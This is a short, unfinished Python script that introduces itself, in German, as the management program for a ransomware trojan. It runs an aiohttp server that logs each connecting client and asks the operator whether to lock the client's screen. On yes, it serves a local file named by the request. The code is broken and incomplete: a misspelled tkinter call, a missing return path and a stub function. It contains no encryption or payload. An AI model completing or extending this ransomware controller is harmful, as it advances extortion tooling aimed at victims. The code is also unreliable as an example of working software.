import tkinter as tk
from tkinter import *
from tkinter import messagebox as mb

from aiohttp import web

print("Willkommen zum Verwaltungsprogramm ihres Ransomware-Trojaners." )
print("Hier sehen sie alle eingehenden verbindungen:" + "\n" )

async def handle(request):
    name = request.match_info.get('name')
    print('Connection to: ' + request.remote)

    res = mb.askquestion("Lock Client Screen?")
    if res == 'yes':
            file = open(name, 'r')
            content = file.read()
            file.close()
            return web.Response(text=content)

    mainWin = tk.TK()

    canvas1 = tk.Canvas(mainWin, width=100, height=100)
    canvas1.pack()

    



app = web.Application()
app.add_routes([web.get('/{name}', handle)])

if __name__ == '__main__':
    web.run_app(app) 
    

 
def test():
    MsgBox = tk.messagebox.askquestion ()